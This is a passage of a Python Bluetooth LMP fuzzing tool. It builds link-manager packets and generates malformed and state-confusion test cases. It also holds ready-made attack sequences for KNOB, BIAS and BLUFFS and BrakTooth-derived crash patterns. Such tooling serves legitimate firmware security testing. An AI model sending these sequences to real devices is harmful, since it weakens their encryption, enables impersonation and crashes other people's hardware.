        ]) + struct.pack("<H", length & 0xFFFF),
    )


def build_encryption_key_size_mask_res(key_size_mask: int = 0xFFFF) -> bytes:
    """Build LMP_encryption_key_size_mask_res (opcode 55).

    Responds with a bitmask of supported encryption key sizes.

    Args:
        key_size_mask: 16-bit bitmask where bit N means key size N+1 supported.

    Returns:
        3-byte PDU: opcode(1) + key_size_mask(2 LE).
    """
    return build_lmp(
        LMP_ENCRYPTION_KEY_SIZE_MASK_RES,
        struct.pack("<H", key_size_mask & 0xFFFF),
    )


def build_set_afh(
    afh_instant: int = 0,
    afh_mode: int = 1,
    afh_channel_map: bytes = b"\xff" * 10,
) -> bytes:
    """Build LMP_set_AFH (opcode 56).

    Sets Adaptive Frequency Hopping channel map.

    Args:
        afh_instant: 32-bit clock instant when AFH takes effect.
        afh_mode: 0 = disabled, 1 = enabled.
        afh_channel_map: 10-byte (79-bit) channel map.

    Returns:
        16-byte PDU: opcode(1) + instant(4 LE) + mode(1) + map(10).
    """
    chan_map = afh_channel_map[:10].ljust(10, b"\xff")
    return build_lmp(
        LMP_SET_AFH,
        struct.pack("<I", afh_instant & 0xFFFFFFFF)
        + bytes([afh_mode & 0xFF])
        + chan_map,
    )


def build_encapsulated_header(
    major_type: int = 1,
    minor_type: int = 1,
    payload_length: int = 48,
) -> bytes:
    """Build LMP_encapsulated_header (opcode 57).

    Indicates the start of an encapsulated PDU transfer (e.g., P-192/P-256
    public key exchange for Secure Simple Pairing).

    Args:
        major_type: Encapsulated major type (1 = Secure Simple Pairing).
        minor_type: Encapsulated minor type.
        payload_length: Total payload length in bytes.

    Returns:
        4-byte PDU: opcode(1) + major_type(1) + minor_type(1) + length(1).
    """
    return build_lmp(
        LMP_ENCAPSULATED_HEADER,
        bytes([major_type & 0xFF, minor_type & 0xFF, payload_length & 0xFF]),
    )


def build_encapsulated_payload(data: bytes | None = None) -> bytes:
    """Build LMP_encapsulated_payload (opcode 58).

    Carries a 16-byte chunk of encapsulated data (e.g., part of an
    ECDH public key).

    Args:
        data: 16-byte payload chunk. Random if None.

    Returns:
        17-byte PDU: opcode(1) + data(16).
    """
    d = data if data is not None else os.urandom(16)
    return build_lmp(LMP_ENCAPSULATED_PAYLOAD, d[:16].ljust(16, b"\x00"))


def build_simple_pairing_confirm() -> bytes:
    """Build LMP_simple_pairing_confirm (opcode 59).

    Confirms readiness for Simple Pairing. No parameters.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_SIMPLE_PAIRING_CONFIRM)


def build_simple_pairing_number(number: bytes | None = None) -> bytes:
    """Build LMP_simple_pairing_number (opcode 60).

    Sends a 128-bit nonce for Simple Pairing commitment verification.

    Args:
        number: 16-byte nonce. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + number(16).
    """
    n = number if number is not None else os.urandom(16)
    return build_lmp(LMP_SIMPLE_PAIRING_NUMBER, n[:16].ljust(16, b"\x00"))


def build_dhkey_check(confirmation: bytes | None = None) -> bytes:
    """Build LMP_dhkey_check (opcode 61).

    Sends the 128-bit DHKey check value to verify Secure Simple Pairing
    ECDH key agreement.

    Args:
        confirmation: 16-byte confirmation value. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + confirmation(16).
    """
    c = confirmation if confirmation is not None else os.urandom(16)
    return build_lmp(LMP_DHKEY_CHECK, c[:16].ljust(16, b"\x00"))


# ===========================================================================
# Packet Builders -- Extended LMP Opcodes (escape_4 prefix)
# ===========================================================================

def _build_ext(ext_opcode: int, params: bytes = b"") -> bytes:
    """Build an extended LMP PDU: [escape_4] + [ext_opcode] + [params].

    Args:
        ext_opcode: Extended opcode (1-22).
        params: Parameter bytes after the extended opcode.

    Returns:
        Raw extended LMP PDU bytes.
    """
    return bytes([LMP_ESCAPE_4, ext_opcode & 0xFF]) + params


def build_ext_accepted(escape_opcode: int, ext_opcode: int) -> bytes:
    """Build accepted_ext (extended opcode 1).

    Acknowledges an extended LMP PDU.

    Args:
        escape_opcode: Escape opcode of the accepted PDU (127).
        ext_opcode: Extended opcode of the accepted PDU.

    Returns:
        4-byte PDU: escape(1) + ext(1) + accepted_esc(1) + accepted_ext(1).
    """
    return _build_ext(
        EXT_ACCEPTED,
        bytes([escape_opcode & 0xFF, ext_opcode & 0xFF]),
    )


def build_ext_not_accepted(
    escape_opcode: int,
    ext_opcode: int,
    error: int = ERROR_UNKNOWN_LMP_PDU,
) -> bytes:
    """Build not_accepted_ext (extended opcode 2).

    Rejects an extended LMP PDU with an error code.

    Args:
        escape_opcode: Escape opcode of the rejected PDU (127).
        ext_opcode: Extended opcode of the rejected PDU.
        error: HCI error code.

    Returns:
        5-byte PDU: escape(1) + ext(1) + rej_esc(1) + rej_ext(1) + error(1).
    """
    return _build_ext(
        EXT_NOT_ACCEPTED,
        bytes([escape_opcode & 0xFF, ext_opcode & 0xFF, error & 0xFF]),
    )


def build_features_req_ext(
    page: int = 1,
    max_page: int = 2,
    features: bytes = b"\xff" * 8,
) -> bytes:
    """Build features_req_ext (extended opcode 3).

    Requests extended feature pages beyond page 0.

    Args:
        page: Features page number to request (1-255).
        max_page: Highest features page supported locally.
        features: 8-byte feature bitmask for the requested page.

    Returns:
        12-byte PDU: escape(1) + ext(1) + page(1) + max_page(1) + features(8).
    """
    feat = features[:8].ljust(8, b"\x00")
    return _build_ext(
        EXT_FEATURES_REQ,
        bytes([page & 0xFF, max_page & 0xFF]) + feat,
    )


def build_features_res_ext(
    page: int = 1,
    max_page: int = 2,
    features: bytes = b"\xff" * 8,
) -> bytes:
    """Build features_res_ext (extended opcode 4).

    Responds with extended feature page data.

    Args:
        page: Features page number being reported.
        max_page: Highest features page supported locally.
        features: 8-byte feature bitmask for this page.

    Returns:
        12-byte PDU: escape(1) + ext(1) + page(1) + max_page(1) + features(8).
    """
    feat = features[:8].ljust(8, b"\x00")
    return _build_ext(
        EXT_FEATURES_RES,
        bytes([page & 0xFF, max_page & 0xFF]) + feat,
    )


def build_clk_adj(
    clk_adj_id: int = 0,
    clk_adj_instant: int = 0,
    clk_adj_us: int = 0,
    clk_adj_slots: int = 0,
) -> bytes:
    """Build clk_adj (extended opcode 5).

    Adjusts the piconet clock.

    Args:
        clk_adj_id: Clock adjustment identifier.
        clk_adj_instant: 32-bit clock instant.
        clk_adj_us: Microsecond adjustment (16-bit LE).
        clk_adj_slots: Slot adjustment.

    Returns:
        10-byte PDU: escape(1) + ext(1) + id(1) + instant(4 LE) + us(2 LE) + slots(1).
    """
    return _build_ext(
        EXT_CLK_ADJ,
        bytes([clk_adj_id & 0xFF])
        + struct.pack("<I", clk_adj_instant & 0xFFFFFFFF)
        + struct.pack("<H", clk_adj_us & 0xFFFF)
        + bytes([clk_adj_slots & 0xFF]),
    )


def build_clk_adj_ack(clk_adj_id: int = 0) -> bytes:
    """Build clk_adj_ack (extended opcode 6).

    Acknowledges a clock adjustment.

    Args:
        clk_adj_id: Clock adjustment identifier being acknowledged.

    Returns:
        3-byte PDU: escape(1) + ext(1) + id(1).
    """
    return _build_ext(EXT_CLK_ADJ_ACK, bytes([clk_adj_id & 0xFF]))


def build_packet_type_table_req(packet_type_table: int = 0) -> bytes:
    """Build packet_type_table_req (extended opcode 7).

    Requests packet type table change (EDR vs. basic rate).

    Args:
        packet_type_table: 0 = 1 Mbps, 1 = 2/3 Mbps EDR.

    Returns:
        3-byte PDU: escape(1) + ext(1) + table(1).
    """
    return _build_ext(
        EXT_PACKET_TYPE_TABLE_REQ,
        bytes([packet_type_table & 0xFF]),
    )


def build_io_capability_req(
    io_cap: int = IO_NO_INPUT_OUTPUT,
    oob: int = 0x00,
    auth_req: int = AUTH_MITM_NOT_REQUIRED_NO_BONDING,
) -> bytes:
    """Build IO_capability_req (extended opcode 11).

    Initiates Secure Simple Pairing by exchanging IO capabilities.
    Used to determine the pairing method (Numeric Comparison, Passkey
    Entry, Just Works, or OOB).

    Args:
        io_cap: IO capability (0x00-0x04).
        oob: OOB authentication data present flag.
        auth_req: Authentication requirements.

    Returns:
        5-byte PDU: escape(1) + ext(1) + io_cap(1) + oob(1) + auth_req(1).
    """
    return _build_ext(
        EXT_IO_CAPABILITY_REQ,
        bytes([io_cap & 0xFF, oob & 0xFF, auth_req & 0xFF]),
    )


def build_io_capability_res(
    io_cap: int = IO_NO_INPUT_OUTPUT,
    oob: int = 0x00,
    auth_req: int = AUTH_MITM_NOT_REQUIRED_NO_BONDING,
) -> bytes:
    """Build IO_capability_res (extended opcode 12).

    Responds with local IO capabilities for Secure Simple Pairing.

    Args:
        io_cap: IO capability (0x00-0x04).
        oob: OOB authentication data present flag.
        auth_req: Authentication requirements.

    Returns:
        5-byte PDU: escape(1) + ext(1) + io_cap(1) + oob(1) + auth_req(1).
    """
    return _build_ext(
        EXT_IO_CAPABILITY_RES,
        bytes([io_cap & 0xFF, oob & 0xFF, auth_req & 0xFF]),
    )


def build_numeric_comparison_failed() -> bytes:
    """Build numeric_comparison_failed (extended opcode 13).

    Indicates the user rejected the numeric comparison value during
    Secure Simple Pairing.

    Returns:
        2-byte PDU: escape(1) + ext(1).
    """
    return _build_ext(EXT_NUMERIC_COMPARISON_FAILED)


def build_passkey_failed() -> bytes:
    """Build passkey_failed (extended opcode 14).

    Indicates passkey entry failed during Secure Simple Pairing.

    Returns:
        2-byte PDU: escape(1) + ext(1).
    """
    return _build_ext(EXT_PASSKEY_FAILED)


def build_oob_failed() -> bytes:
    """Build oob_failed (extended opcode 15).

    Indicates OOB data exchange failed during Secure Simple Pairing.

    Returns:
        2-byte PDU: escape(1) + ext(1).
    """
    return _build_ext(EXT_OOB_FAILED)


def build_keypress_notification(notification_type: int = 0) -> bytes:
    """Build keypress_notification (extended opcode 16).

    Notifies the remote device of a keypress event during passkey entry.

    Args:
        notification_type: 0=started, 1=digit entered, 2=erased, 3=cleared, 4=completed.

    Returns:
        3-byte PDU: escape(1) + ext(1) + type(1).
    """
    return _build_ext(
        EXT_KEYPRESS_NOTIFICATION,
        bytes([notification_type & 0xFF]),
    )


def build_power_control_req(adjustment: int = 0) -> bytes:
    """Build power_control_req (extended opcode 17).

    Requests transmit power adjustment.

    Args:
        adjustment: Power adjustment request (implementation-defined).

    Returns:
        3-byte PDU: escape(1) + ext(1) + adjustment(1).
    """
    return _build_ext(EXT_POWER_CONTROL_REQ, bytes([adjustment & 0xFF]))


def build_power_control_res(adjustment: int = 0) -> bytes:
    """Build power_control_res (extended opcode 18).

    Responds to a power control request.

    Args:
        adjustment: Actual power adjustment applied.

    Returns:
        3-byte PDU: escape(1) + ext(1) + adjustment(1).
    """
    return _build_ext(EXT_POWER_CONTROL_RES, bytes([adjustment & 0xFF]))


def build_ping_req() -> bytes:
    """Build ping_req (extended opcode 21).

    Sends an LMP ping to verify link-layer encryption is still active
    (authenticated payload timeout check, BT 4.1+).

    Returns:
        2-byte PDU: escape(1) + ext(1).
    """
    return _build_ext(EXT_PING_REQ)


def build_ping_res() -> bytes:
    """Build ping_res (extended opcode 22).

    Responds to an LMP ping.

    Returns:
        2-byte PDU: escape(1) + ext(1).
    """
    return _build_ext(EXT_PING_RES)


# ===========================================================================
# Fuzz Case Generators -- Each yields (label, payload) tuples
# ===========================================================================

def fuzz_all_opcodes(
    count_per_opcode: int = 3,
) -> Generator[tuple[str, bytes], None, None]:
    """Generate fuzz cases for all standard + extended opcodes with random params.

    For each defined standard opcode, generates ``count_per_opcode`` PDUs with
    random parameter bytes sized to fill the expected PDU length. For extended
    opcodes, the escape prefix is prepended automatically.

    Args:
        count_per_opcode: Number of random variants per opcode.

    Yields:
        (label, payload) where label describes the opcode and variant number.
    """
    # Standard opcodes
    for opcode, name in COMMAND_NAMES.items():
        if opcode == LMP_ESCAPE_4:
            continue  # Extended opcodes handled separately
        expected_size = COMMAND_SIZES.get(opcode, 2)
        param_len = max(0, expected_size - 1)
        for i in range(count_per_opcode):
            params = os.urandom(param_len) if param_len > 0 else b""
            yield (f"{name}_rand_{i}", build_lmp(opcode, params))

    # Extended opcodes
    for ext_opcode, name in EXT_COMMAND_NAMES.items():
        expected_size = EXT_COMMAND_SIZES.get(ext_opcode, 3)
        param_len = max(0, expected_size - 2)  # Subtract escape + ext_opcode
        for i in range(count_per_opcode):
            params = os.urandom(param_len) if param_len > 0 else b""
            yield (f"ext_{name}_rand_{i}", _build_ext(ext_opcode, params))


def fuzz_enc_key_size() -> Generator[tuple[str, bytes], None, None]:
    """KNOB attack: key sizes 0-255 for LMP_encryption_key_size_req.

    CVE-2019-9506 exploits the fact that the BT spec allows key sizes as
    low as 1 byte. This generator tests every possible key_size value to
    find implementations that accept weak key sizes without rejecting them.

    Yields:
        (label, payload) for each key_size value 0-255.
    """
    for size in range(256):
        yield (f"knob_key_size_{size}", build_enc_key_size_req(key_size=size))


def fuzz_features() -> Generator[tuple[str, bytes], None, None]:
    """Feature bitmask variations for LMP_features_res.

    Tests how the remote device handles unusual feature bitmasks:
    all zeros (no features), all ones (all features), single-bit
    toggles, and random patterns.

    Yields:
        (label, payload) for each feature bitmask variant.
    """
    # All zeros -- no features claimed
    yield ("features_all_zero", build_features_res(features=b"\x00" * 8))

    # All ones -- every feature claimed
    yield ("features_all_ones", build_features_res(features=b"\xff" * 8))

    # Single-bit set in each byte position
    for byte_pos in range(8):
        for bit in range(8):
            mask = bytearray(8)
            mask[byte_pos] = 1 << bit
            feat_name = f"features_bit_{byte_pos * 8 + bit}"
            yield (feat_name, build_features_res(features=bytes(mask)))

    # Random feature masks
    for i in range(8):
        yield (f"features_random_{i}", build_features_res(features=os.urandom(8)))

    # Extended features page variations
    yield (
        "ext_features_all_zero",
        build_features_res_ext(page=1, features=b"\x00" * 8),
    )
    yield (
        "ext_features_all_ones",
        build_features_res_ext(page=1, features=b"\xff" * 8),
    )
    # High page numbers
    for page in [0, 1, 2, 127, 255]:
        yield (
            f"ext_features_page_{page}",
            build_features_req_ext(page=page, max_page=255),
        )


def fuzz_truncated() -> Generator[tuple[str, bytes], None, None]:
    """Valid opcodes with missing/truncated parameters.

    Tests bounds checking by sending PDUs that are shorter than the
    expected fixed size for each command.

    Yields:
        (label, payload) for each truncation variant.
    """
    # Build full PDUs and then truncate them
    full_pdus: list[tuple[str, bytes]] = [
        ("name_req", build_name_req()),
        ("name_res", build_name_res()),
        ("not_accepted", build_not_accepted(LMP_FEATURES_REQ)),
        ("clkoffset_res", build_clkoffset_res()),
        ("au_rand", build_au_rand()),
        ("sres", build_sres()),
        ("enc_key_size_req", build_enc_key_size_req()),
        ("start_enc_req", build_start_encryption_req()),
        ("switch_req", build_switch_req()),
        ("version_res", build_version_res()),
        ("features_res", build_features_res()),
        ("slot_offset", build_slot_offset()),
        ("quality_of_service", build_quality_of_service()),
        ("set_afh", build_set_afh()),
        ("encapsulated_header", build_encapsulated_header()),
        ("encapsulated_payload", build_encapsulated_payload()),
        ("simple_pairing_number", build_simple_pairing_number()),
        ("dhkey_check", build_dhkey_check()),
        ("test_control", build_test_control()),
        ("io_cap_req", build_io_capability_req()),
        ("io_cap_res", build_io_capability_res()),
        ("ext_features_req", build_features_req_ext()),
        ("ext_not_accepted", build_ext_not_accepted(LMP_ESCAPE_4, EXT_FEATURES_REQ)),
    ]

    for name, pdu in full_pdus:
        if len(pdu) <= 1:
            continue
        # Just the opcode(s), missing all data
        yield (f"trunc_{name}_opcode_only", pdu[:1])
        # Half the expected data
        half = max(2, len(pdu) // 2)
        if half < len(pdu):
            yield (f"trunc_{name}_half", pdu[:half])
        # One byte short
        if len(pdu) > 2:
            yield (f"trunc_{name}_minus1", pdu[:-1])


def fuzz_oversized() -> Generator[tuple[str, bytes], None, None]:
    """Valid opcodes with extra trailing bytes up to firmware send limit.

    Tests whether implementations reject or silently process extra data
    appended after the expected parameters.

    Yields:
        (label, payload) for each oversized variant.
    """
    # Opcodes that normally have small PDUs
    small_pdus: list[tuple[str, bytes]] = [
        ("clkoffset_req", build_clkoffset_req()),
        ("stop_enc_req", build_stop_encryption_req()),
        ("timing_accuracy_req", build_timing_accuracy_req()),
        ("setup_complete", build_setup_complete()),
        ("host_conn_req", build_host_connection_req()),
        ("version_req", build_version_req()),
        ("features_req", build_features_req()),
        ("accepted", build_accepted(LMP_FEATURES_REQ)),
        ("enc_key_size_req", build_enc_key_size_req()),
        ("detach", build_detach()),
        ("ping_req", build_ping_req()),
        ("ping_res", build_ping_res()),
        ("simple_pairing_confirm", build_simple_pairing_confirm()),
    ]

    for name, pdu in small_pdus:
        # Fill to firmware max send size
        pad_len = FIRMWARE_MAX_SEND - len(pdu)
        if pad_len > 0:
            yield (f"oversized_{name}_pad_{pad_len}", pdu + os.urandom(pad_len))
        # Fill to the full spec-maximum 17-byte PDU (patched firmware handles this)
        yield (f"oversized_{name}_max17", pdu + os.urandom(MAX_LMP_PDU - len(pdu)))


def fuzz_invalid_opcodes() -> Generator[tuple[str, bytes], None, None]:
    """Undefined opcode values in the reserved range.

    Standard opcodes 1-126 have gaps (e.g., 20-22, 24, 32, 35-36, 41-44,
    46-48, 50). Extended opcodes also have undefined ranges. Tests how the
    remote handles unknown opcodes.

    Yields:
        (label, payload) for each undefined opcode.
    """
    # Undefined standard opcodes
    for opcode in range(1, 127):
        if opcode not in DEFINED_COMMANDS:
            yield (
                f"undefined_std_opcode_{opcode}",
                build_lmp(opcode, os.urandom(min(16, FIRMWARE_MAX_SEND - 1))),
            )

    # Opcode 0 (reserved) — fill remaining bytes to firmware max
    yield ("reserved_opcode_0", bytes([0x00]) + os.urandom(FIRMWARE_MAX_SEND - 1))

    # Undefined extended opcodes
    for ext_opcode in range(1, 32):
        if ext_opcode not in DEFINED_EXT_COMMANDS:
            yield (
                f"undefined_ext_opcode_{ext_opcode}",
                _build_ext(ext_opcode, os.urandom(min(15, FIRMWARE_MAX_SEND - 2))),
            )

    # High extended opcodes (well beyond defined range)
    for ext_opcode in [64, 128, 200, 255]:
        yield (
            f"undefined_ext_opcode_{ext_opcode}",
            _build_ext(ext_opcode, os.urandom(min(15, FIRMWARE_MAX_SEND - 2))),
        )


def fuzz_invalid_tid() -> Generator[tuple[str, bytes], None, None]:
    """Byte-0 manipulation testing TID-related encoding edge cases.

    Over-the-air, byte 0 = (opcode << 1) | tid. DarkFirmware handles this
    encoding, but we test raw byte-0 values that would decode to unusual
    opcode/tid combinations if interpreted directly.

    Yields:
        (label, payload) for each TID manipulation variant.
    """
    # Raw byte values that encode as opcode=X, tid=1 (unusual initiator)
    security_opcodes = [
        LMP_AU_RAND, LMP_SRES, LMP_ENCRYPTION_MODE_REQ,
        LMP_ENCRYPTION_KEY_SIZE_REQ, LMP_START_ENCRYPTION_REQ,
        LMP_ACCEPTED, LMP_NOT_ACCEPTED,
    ]
    for opcode in security_opcodes:
        # Encode as if tid=1 (set LSB of the encoded byte)
        encoded_byte = ((opcode & 0x7F) << 1) | 1
        param_len = max(0, COMMAND_SIZES.get(opcode, 2) - 1)
        params = os.urandom(param_len) if param_len > 0 else b""
        yield (
            f"tid1_raw_{COMMAND_NAMES.get(opcode, str(opcode))}",
            bytes([encoded_byte]) + params,
        )

    # Zero byte (opcode=0, tid=0) — fill to firmware max
    yield ("tid_zero_byte", b"\x00" + os.urandom(FIRMWARE_MAX_SEND - 1))

    # All-ones byte (opcode=127, tid=1 -> escape with tid=1) — fill to firmware max
    yield ("tid_all_ones", b"\xff" + os.urandom(FIRMWARE_MAX_SEND - 2))


def fuzz_io_capabilities() -> Generator[tuple[str, bytes], None, None]:
    """IO capability value sweep for IO_capability_req/res.

    Valid values are 0x00-0x04. Values 0x05-0xFF are reserved and should
    be rejected. Tests IO capability validation in SSP.

    Yields:
        (label, payload) for each IO capability value.
    """
    for io_val in range(256):
        yield (
            f"io_cap_req_{io_val:#04x}",
            build_io_capability_req(io_cap=io_val),
        )
    # Also test in response direction
    for io_val in [0x00, 0x04, 0x05, 0x80, 0xFF]:
        yield (
            f"io_cap_res_{io_val:#04x}",
            build_io_capability_res(io_cap=io_val),
        )


def fuzz_auth_requirements() -> Generator[tuple[str, bytes], None, None]:
    """Authentication requirement value sweep in IO_capability_req.

    Tests all defined auth requirement values plus reserved/invalid ones.

    Yields:
        (label, payload) for each auth requirement value.
    """
    interesting = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x80, 0xFF]
    for auth_val in interesting:
        yield (
            f"auth_req_{auth_val:#04x}",
            build_io_capability_req(auth_req=auth_val),
        )


# ===========================================================================
# CVE-Specific Templates
# ===========================================================================

def knob_template() -> bytes:
    """CVE-2019-9506 (KNOB): LMP_encryption_key_size_req with key_size=1.

    The Key Negotiation of Bluetooth (KNOB) attack forces the encryption
    key size to the minimum (1 byte = 8 bits of entropy), making brute
    force trivial. The attacker MITMs the LMP negotiation and replaces
    the proposed key size with 1.

    Returns:
        2-byte LMP PDU requesting 1-byte encryption key.
    """
    return build_enc_key_size_req(key_size=1)


def bias_role_switch_sequence() -> list[tuple[str, bytes]]:
    """CVE-2020-10135 (BIAS): LMP sequence for role switch exploitation.

    The Bluetooth Impersonation AttackS (BIAS) exploit the fact that
    mutual authentication is not enforced during role switching. The
    attacker initiates a role switch to become central, then downgrades
    to legacy authentication (or skips it) to impersonate a previously
    paired device.

    The sequence:
      1. Request role switch (become central)
      2. Accept the features exchange
      3. Request legacy authentication (au_rand challenge)
      4. Force encryption with minimum key size (KNOB combo)
      5. Start encryption

    Returns:
        List of (label, payload) tuples forming the BIAS attack sequence.
    """
    return [
        ("bias_1_switch_req", build_switch_req(switch_instant=0)),
        ("bias_2_features_req", build_features_req()),
        ("bias_3_au_rand", build_au_rand()),
        ("bias_4_enc_mode_req", build_encryption_mode_req(mode=1)),
        ("bias_5_enc_key_size_1", build_enc_key_size_req(key_size=1)),
        ("bias_6_start_enc", build_start_encryption_req()),
    ]


def bluffs_downgrade_sequence() -> list[tuple[str, bytes]]:
    """CVE-2023-24023 (BLUFFS): Session key diversification downgrade.

    The BLUFFS attacks exploit lack of forward and future secrecy in
    Bluetooth session establishment. By manipulating LMP exchanges, an
    attacker can force reuse of weak session keys across sessions.

    The sequence forces legacy pairing, minimum key size, and predictable
    random values to enable session key reuse.

    Returns:
        List of (label, payload) tuples forming the BLUFFS downgrade sequence.
    """
    # Use fixed (non-random) values to force deterministic key derivation
    fixed_rand = b"\x00" * 16
    return [
        ("bluffs_1_features_no_sc", build_features_res(
            features=b"\xbf\xfe\x8f\xfe\xd8\x3f\x5b\x87",  # SC bit cleared
        )),
        ("bluffs_2_in_rand_fixed", build_in_rand(random_number=fixed_rand)),
        ("bluffs_3_comb_key_fixed", build_comb_key(random_number=fixed_rand)),
        ("bluffs_4_au_rand_fixed", build_au_rand(random_number=fixed_rand)),
        ("bluffs_5_enc_key_size_1", build_enc_key_size_req(key_size=1)),
        ("bluffs_6_start_enc_fixed", build_start_encryption_req(random_number=fixed_rand)),
    ]


# ===========================================================================
# LMP State Machine — State Definitions
# ===========================================================================


class LMPState:
    """LMP connection state machine states."""

    IDLE = "idle"
    FEATURES = "features"                # Feature exchange in progress
    AUTHENTICATION = "authentication"    # AU_RAND / SRES exchange
    ENCRYPTION_SETUP = "encryption"      # Key size + mode negotiation
    CONNECTED = "connected"              # Setup complete, normal operation


# Valid state transitions (from BT Core Spec Vol 2, Part C)
VALID_TRANSITIONS: dict[str, list[str]] = {
    LMPState.IDLE: [LMPState.FEATURES],
    LMPState.FEATURES: [LMPState.AUTHENTICATION, LMPState.CONNECTED],
    LMPState.AUTHENTICATION: [LMPState.ENCRYPTION_SETUP, LMPState.CONNECTED],
    LMPState.ENCRYPTION_SETUP: [LMPState.CONNECTED],
    LMPState.CONNECTED: [LMPState.AUTHENTICATION],  # re-keying
}

# Opcodes associated with each state
STATE_OPCODES: dict[str, list[int]] = {
    LMPState.FEATURES: [
        LMP_FEATURES_REQ, LMP_FEATURES_RES,
        LMP_VERSION_REQ, LMP_VERSION_RES,
    ],
    LMPState.AUTHENTICATION: [
        LMP_AU_RAND, LMP_SRES, LMP_IN_RAND, LMP_COMB_KEY,
    ],
    LMPState.ENCRYPTION_SETUP: [
        LMP_ENCRYPTION_MODE_REQ, LMP_ENCRYPTION_KEY_SIZE_REQ,
        LMP_START_ENCRYPTION_REQ, LMP_STOP_ENCRYPTION_REQ,
    ],
    LMPState.CONNECTED: [
        LMP_SETUP_COMPLETE, LMP_DETACH, LMP_MAX_SLOT_REQ,
    ],
}


# ===========================================================================
# LMP State Confusion Fuzz Generators
# ===========================================================================


def fuzz_state_confusion() -> Generator[tuple[str, list[bytes]], None, None]:
    """Generate LMP sequences that violate the state machine.

    Each case is ``(label, [packet1, packet2, ...])`` where the sequence
    should trigger state confusion in the target's link manager.

    Based on BrakTooth research which found 18 CVEs via LMP state confusion.
    """
    # --- Encryption before authentication ---
    yield ("enc_before_auth", [
        build_encryption_mode_req(1),
        build_enc_key_size_req(16),
    ])

    # --- Setup complete before features ---
    yield ("setup_before_features", [build_setup_complete()])

    # --- Double features negotiation ---
    yield ("double_features", [build_features_req(), build_features_req()])

    # --- Unsolicited SRES (response without challenge) ---
    yield ("unsolicited_sres", [build_sres(b"\x00\x00\x00\x00")])

    # --- Role switch during encryption setup ---
    yield ("switch_during_encryption", [
        build_encryption_mode_req(1),
        build_switch_req(0),
    ])

    # --- Detach during authentication ---
    yield ("detach_during_auth", [
        build_au_rand(),
        build_detach(0x13),
    ])

    # --- Start encryption without mode request ---
    yield ("start_enc_no_mode", [build_start_encryption_req()])

    # --- Stop encryption when not encrypted ---
    yield ("stop_enc_not_encrypted", [build_stop_encryption_req()])

    # --- Accepted for opcode never sent ---
    yield ("accept_phantom", [build_accepted(LMP_FEATURES_REQ)])

    # --- Not accepted for opcode never sent ---
    yield ("reject_phantom", [build_not_accepted(LMP_AU_RAND, 0x19)])

    # --- Rapid state cycling ---
    yield ("rapid_state_cycle", [
        build_features_req(),
        build_setup_complete(),
        build_features_req(),
        build_setup_complete(),
    ])

    # --- All encryption opcodes in rapid succession ---
    yield ("enc_opcode_barrage", [
        build_encryption_mode_req(1),
        build_enc_key_size_req(1),
        build_start_encryption_req(),
        build_stop_encryption_req(),
        build_encryption_mode_req(0),
    ])

    # --- Extended opcode state confusion (unsolicited IO capability) ---
    yield ("ext_io_cap_unsolicited", [
        build_io_capability_req(0x03, 0x00, 0x00),
        build_io_capability_res(0x00, 0x00, 0x05),
    ])

    # --- Authentication during encryption (re-keying race) ---
    yield ("auth_during_encryption", [
        build_encryption_mode_req(1),
        build_enc_key_size_req(16),
        build_au_rand(),
    ])

    # --- Double setup_complete ---
    yield ("double_setup_complete", [
        build_setup_complete(),
        build_setup_complete(),
    ])

    # --- Version request during encryption setup ---
    yield ("version_during_enc", [
        build_encryption_mode_req(1),
        build_version_req(),
    ])

    # --- Key size negotiation after start_encryption (out of order) ---
    yield ("key_size_after_start", [
        build_start_encryption_req(),
        build_enc_key_size_req(1),
    ])

    # --- Accepted for extended opcode never sent ---
    yield ("ext_accept_phantom", [
        build_ext_accepted(LMP_ESCAPE_4, EXT_IO_CAPABILITY_REQ),
    ])

    # --- IO capability during authentication (wrong phase) ---
    yield ("io_cap_during_auth", [
        build_au_rand(),
        build_io_capability_req(0x03, 0x00, 0x00),
    ])

    # --- Comb key without in_rand (skip init key step) ---
    yield ("comb_key_no_in_rand", [build_comb_key()])

    # --- Unit key (deprecated) injection ---
    yield ("unit_key_injection", [build_unit_key()])

    # --- Host connection request after setup complete ---
    yield ("host_conn_after_setup", [
        build_setup_complete(),
        build_host_connection_req(),
    ])

    # --- Encapsulated payload without header ---
    yield ("encap_payload_no_header", [build_encapsulated_payload()])

    # --- Numeric comparison failed without IO capability exchange ---
    yield ("num_cmp_failed_no_io", [build_numeric_comparison_failed()])

    # --- DHKey check without SSP negotiation ---
    yield ("dhkey_no_ssp", [build_dhkey_check()])

    # --- Ping during setup (before encryption established) ---
    yield ("ping_during_setup", [
        build_features_req(),
        build_ping_req(),
    ])

    # --- Max slot change during encryption setup ---
    yield ("max_slot_during_enc", [
        build_encryption_mode_req(1),
        build_max_slot_req(1),
    ])

    # --- Supervision timeout change during authentication ---
    yield ("supervision_during_auth", [
        build_au_rand(),
        build_supervision_timeout(0x0001),
    ])


def fuzz_braktooth_patterns() -> Generator[tuple[str, list[bytes]], None, None]:
    """BrakTooth-specific test patterns that found real CVEs.

    Based on published BrakTooth research targeting LMP implementation
    bugs across ESP32, Qualcomm, Intel, and CSR chipsets.
    """
    # Based on CVE-2021-28139 (ESP32 features overflow)
    yield ("oversized_features_res", [build_features_res(b"\xff" * 8)])

    # Truncated timing accuracy (null deref pattern)
    yield ("truncated_timing", [build_lmp(LMP_TIMING_ACCURACY_REQ)])

    # Undefined opcodes in auth state
    for op in range(68, 80):
        yield (f"undefined_op_{op}_during_auth", [
            build_features_req(),
            build_lmp(op, os.urandom(8)),
        ])

    # CVE-2021-34147 pattern: LMP_AU_RAND flood (duplicate challenge)
    yield ("au_rand_flood", [build_au_rand() for _ in range(5)])

    # CVE-2021-34148 pattern: oversized LMP_name_res
    yield ("oversized_name_res", [
        build_name_res(name_offset=0, name=b"\x41" * 248),
    ])

    # CVE-2021-34149 pattern: malformed encapsulated PDU length
    yield ("encap_bad_length", [
        build_encapsulated_header(major_type=1, minor_type=1, payload_length=255),
        build_encapsulated_payload(b"\xff" * 16),
    ])

    # Same-opcode rapid fire (link manager confusion)
    yield ("rapid_accepted", [build_accepted(op) for op in [3, 7, 11, 15, 17]])

    # LMP_not_accepted with every possible error code for security opcodes
    for err in [0x00, 0x05, 0x06, 0x11, 0x19, 0x23, 0x24, 0x25]:
        yield (f"not_accepted_enc_err_{err:#04x}", [
            build_not_accepted(LMP_ENCRYPTION_MODE_REQ, err),
        ])

    # Truncated extended PDU (escape byte only)
